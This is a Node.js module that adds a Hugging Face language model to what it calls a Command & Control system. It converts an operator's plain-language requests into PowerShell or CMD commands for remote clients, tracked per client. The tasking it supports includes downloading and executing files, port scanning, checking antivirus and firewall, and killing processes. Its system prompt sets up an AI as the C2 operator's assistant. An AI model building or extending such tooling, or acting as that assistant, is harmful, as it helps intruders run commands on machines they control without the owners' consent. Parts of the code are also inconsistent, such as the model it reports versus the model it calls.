const { HfInference } = require('@huggingface/inference');

/**
 * Hugging Face AI-Powered Command Processor
 * Completely free alternative with no billing required
 */
class HuggingFaceAICommandProcessor {
    constructor() {
        // Initialize Hugging Face client
        const apiKey = process.env.HUGGINGFACE_API_KEY;
        console.log('[HUGGINGFACE AI] API Key available:', !!apiKey);
        console.log('[HUGGINGFACE AI] API Key length:', apiKey ? apiKey.length : 0);
        
        if (apiKey && apiKey !== 'your-huggingface-api-key-here') {
            this.hf = new HfInference(apiKey);
            this.isAvailable = true;
            console.log('[HUGGINGFACE AI] Hugging Face AI initialized successfully');
        } else {
            console.log('[HUGGINGFACE AI] Hugging Face API key not configured, using fallback mode');
            this.isAvailable = false;
        }
        
        this.conversationHistory = new Map(); // Store conversation context per client
        this.commandPatterns = new Map(); // Learn from successful patterns
        this.errorSolutions = new Map(); // Learn from error resolutions
        
        // System prompt for Hugging Face AI
        this.systemPrompt = `You are an advanced AI assistant for a Command & Control (C2) system. Your role is to:

1. **Understand User Intent**: Convert natural language requests into technical commands
2. **Generate Optimized Commands**: Create PowerShell, CMD, or other commands that work reliably
3. **Handle Errors Intelligently**: When commands fail, suggest better alternatives
4. **Learn from Context**: Remember what works for each client and adapt accordingly
5. **Ensure Security**: Never generate commands that could harm the system

**Available Command Categories:**
- download_exec: Download and execute files
- system_info: Get system information (computer, memory, CPU, disk, network, users, processes, services)
- file_ops: File operations (list, copy, delete, search)
- network: Network operations (ping, port scan, network info)
- security: Security checks (firewall, antivirus)
- system_mgmt: System management (restart services, kill processes)

**Response Format:**
Always respond with a JSON object containing:
{
  "command": "actual_command_to_execute",
  "type": "powershell|cmd|wmic",
  "timeout": 300,
  "explanation": "human_readable_explanation",
  "safety_level": "safe|moderate|risky",
  "alternatives": ["alternative_command_1", "alternative_command_2"]
}

**Important Guidelines:**
- Always add error handling to commands
- Use PowerShell over CMD when possible
- Add progress indicators for long operations
- Include file verification for downloads
- Never execute dangerous commands without confirmation
- Optimize for Windows 11 compatibility (avoid deprecated WMIC)`;
    }

    /**
     * Process command using Hugging Face AI
     */
    async processCommandWithAI(userInput, clientInfo, context = {}) {
        try {
            console.log('[HUGGINGFACE AI] Processing command with Hugging Face:', userInput);
            
            if (!this.isAvailable) {
                console.log('[HUGGINGFACE AI] Hugging Face not available, falling back to rule-based processing');
                return await this.fallbackProcessing(userInput, clientInfo, context);
            }
            
            // Get conversation history for this client
            const clientId = clientInfo.uuid;
            const history = this.conversationHistory.get(clientId) || [];
            
            // Prepare prompt for Hugging Face
            const prompt = this.buildHuggingFacePrompt(userInput, clientInfo, context, history);
            
            // For now, let's use a simpler approach that works with available models
            // We'll use the rule-based system as primary and Hugging Face for enhancement
            console.log('[HUGGINGFACE AI] Using rule-based processing with Hugging Face enhancement');
            
            // Import the original AI processor as fallback
            const AICommandProcessor = require('./aiCommandProcessor');
            const fallbackProcessor = new AICommandProcessor();
            
            // For natural language processing, always use generateNaturalLanguageCommand
            const result = await fallbackProcessor.generateNaturalLanguageCommand('process', { userInput });
            
            // Return the rule-based result without Hugging Face enhancement
            // (Hugging Face enhancement was corrupting CMD commands with PowerShell syntax)
            console.log('[HUGGINGFACE AI] Using rule-based result without enhancement to preserve command syntax');
            
            return result;

        } catch (error) {
            console.error('[HUGGINGFACE AI] Error processing with AI:', error);
            
            // Fallback to rule-based system
            return await this.fallbackProcessing(userInput, clientInfo, context);
        }
    }

    /**
     * Build Hugging Face prompt with context
     */
    buildHuggingFacePrompt(userInput, clientInfo, context, history) {
        const platform = clientInfo.platform || 'unknown';
        const systemInfo = clientInfo.systemInfo || {};
        
        let prompt = `${this.systemPrompt}

User Request: "${userInput}"

Client Context:
- Platform: ${platform}
- Computer Name: ${systemInfo.ComputerName || 'Unknown'}
- OS Version: ${systemInfo.OSVersion || 'Unknown'}
- Architecture: ${systemInfo.Is64BitOperatingSystem === 'True' ? '64-bit' : '32-bit'}
- Total Memory: ${systemInfo.TotalPhysicalMemory || 'Unknown'}

Additional Context: ${JSON.stringify(context)}

Please generate an optimized command that will work reliably on this system. Consider the platform capabilities and provide alternatives if needed.

Respond ONLY with valid JSON in the specified format.`;

        // Add recent conversation history
        if (history.length > 0) {
            prompt += '\n\nRecent conversation:';
            history.slice(-5).forEach(msg => {
                prompt += `\n${msg.role}: ${msg.content}`;
            });
        }

        return prompt;
    }

    /**
     * Validate AI response format
     */
    validateAIResponse(response) {
        return response && 
               typeof response.command === 'string' && 
               response.command.length > 0 &&
               ['powershell', 'cmd', 'wmic'].includes(response.type);
    }

    /**
     * Fallback to rule-based processing
     */
    async fallbackProcessing(userInput, clientInfo, context) {
        console.log('[HUGGINGFACE AI] Falling back to rule-based processing');
        
        // Import the original AI processor as fallback
        const AICommandProcessor = require('./aiCommandProcessor');
        const fallbackProcessor = new AICommandProcessor();
        
        // Try to extract category and action from user input
        const extracted = this.extractCommandInfo(userInput);
        
        return await fallbackProcessor.processCommand(extracted, clientInfo);
    }

    /**
     * Extract command information from natural language
     */
    extractCommandInfo(userInput) {
        const input = userInput.toLowerCase();
        
        // Download and execute patterns
        if (input.includes('download') || input.includes('get file') || input.includes('fetch')) {
            return {
                category: 'download_exec',
                action: 'download_and_execute',
                params: this.extractDownloadParams(userInput)
            };
        }
        
        // System information patterns
        if (input.includes('system info') || input.includes('computer info') || input.includes('system information')) {
            return {
                category: 'system_info',
                action: 'computer',
                params: {}
            };
        }
        
        if (input.includes('memory') || input.includes('ram')) {
            return {
                category: 'system_info',
                action: 'memory',
                params: {}
            };
        }
        
        if (input.includes('cpu') || input.includes('processor')) {
            return {
                category: 'system_info',
                action: 'cpu',
                params: {}
            };
        }
        
        // File operations patterns
        if (input.includes('list files') || input.includes('show files') || input.includes('dir')) {
            return {
                category: 'file_ops',
                action: 'list_files',
                params: { sourcePath: 'C:\\' }
            };
        }
        
        // Network operations patterns
        if (input.includes('ping') || input.includes('test connection')) {
            return {
                category: 'network',
                action: 'ping',
                params: { target: 'google.com', count: 4 }
            };
        }
        
        // Default to system info
        return {
            category: 'system_info',
            action: 'computer',
            params: {}
        };
    }

    /**
     * Extract download parameters from natural language
     */
    extractDownloadParams(userInput) {
        const urlMatch = userInput.match(/https?:\/\/[^\s]+/);
        const executeMatch = userInput.match(/execut?e|run|launch/i);
        
        return {
            url: urlMatch ? urlMatch[0] : '',
            execute: !!executeMatch,
            savePath: 'C:\\temp\\downloaded_file.exe'
        };
    }

    /**
     * Handle errors with AI-powered solutions
     */
    async handleErrorWithAI(error, originalCommand, clientInfo, retryCount = 0) {
        try {
            console.log('[HUGGINGFACE AI] Handling error with AI:', error.message);
            
            if (!this.isAvailable) {
                console.log('[HUGGINGFACE AI] Hugging Face not available for error handling');
                return await this.fallbackErrorHandling(error, originalCommand, clientInfo, retryCount);
            }
            
            const clientId = clientInfo.uuid;
            const history = this.conversationHistory.get(clientId) || [];
            
            const prompt = `You are an AI assistant that helps fix command execution errors. When a command fails, analyze the error and provide a better alternative.

Error: ${error.message}
Original Command: ${originalCommand.command}
Client Platform: ${clientInfo.platform}
Retry Count: ${retryCount}

Provide a JSON response with:
{
  "fixed_command": "improved_command",
  "explanation": "why_this_will_work",
  "changes_made": ["list_of_improvements"]
}`;

            const result = await this.hf.textGeneration({
                model: 'microsoft/DialoGPT-medium',
                inputs: prompt,
                parameters: {
                    max_new_tokens: 300,
                    temperature: 0.2,
                    return_full_text: false
                }
            });
            
            const aiResponseText = result.generated_text;
            
            // Parse JSON response
            const jsonMatch = aiResponseText.match(/\{[\s\S]*\}/);
            if (!jsonMatch) {
                throw new Error('No JSON found in response');
            }
            
            const aiResponse = JSON.parse(jsonMatch[0]);
            
            // Store error solution for learning
            this.errorSolutions.set(`${clientId}_${error.message}`, {
                originalCommand: originalCommand.command,
                fixedCommand: aiResponse.fixed_command,
                explanation: aiResponse.explanation,
                timestamp: new Date().toISOString()
            });

            return {
                success: true,
                data: {
                    command: aiResponse.fixed_command,
                    explanation: aiResponse.explanation,
                    changes_made: aiResponse.changes_made,
                    aiProcessed: true,
                    retryCount: retryCount + 1
                }
            };

        } catch (aiError) {
            console.error('[HUGGINGFACE AI] Error in AI error handling:', aiError);
            
            // Fallback to rule-based error handling
            return await this.fallbackErrorHandling(error, originalCommand, clientInfo, retryCount);
        }
    }

    /**
     * Fallback error handling
     */
    async fallbackErrorHandling(error, originalCommand, clientInfo, retryCount) {
        const SmartErrorHandler = require('./smartErrorHandler');
        const errorHandler = new SmartErrorHandler();
        
        return await errorHandler.handleError(error, originalCommand, clientInfo, retryCount);
    }

    /**
     * Learn from successful command patterns
     */
    learnFromSuccess(userInput, aiResponse, clientInfo) {
        const pattern = {
            input: userInput,
            command: aiResponse.command,
            type: aiResponse.type,
            success: true,
            timestamp: new Date().toISOString(),
            clientInfo: {
                platform: clientInfo.platform,
                osVersion: clientInfo.systemInfo?.OSVersion
            }
        };
        
        this.commandPatterns.set(`${userInput}_${clientInfo.platform}`, pattern);
        
        // Keep only last 1000 patterns to avoid memory issues
        if (this.commandPatterns.size > 1000) {
            const firstKey = this.commandPatterns.keys().next().value;
            this.commandPatterns.delete(firstKey);
        }
    }

    /**
     * Get AI statistics and learning data
     */
    getAIStatistics() {
        return {
            totalConversations: Array.from(this.conversationHistory.values()).reduce((sum, history) => sum + history.length, 0),
            learnedPatterns: this.commandPatterns.size,
            errorSolutions: this.errorSolutions.size,
            activeClients: this.conversationHistory.size,
            model: 'codellama-7b-instruct',
            timestamp: new Date().toISOString()
        };
    }

    /**
     * Test AI connection
     */
    async testAIConnection() {
        try {
            if (!this.isAvailable) {
                console.log('[HUGGINGFACE AI] Hugging Face not available for connection test');
                return false;
            }
            
            const result = await this.hf.fillMask({
                model: 'bert-base-uncased',
                inputs: 'Hello [MASK] world!'
            });
            
            return result && result.length > 0;
        } catch (error) {
            console.error('[HUGGINGFACE AI] Connection test failed:', error);
            return false;
        }
    }
}

module.exports = HuggingFaceAICommandProcessor;
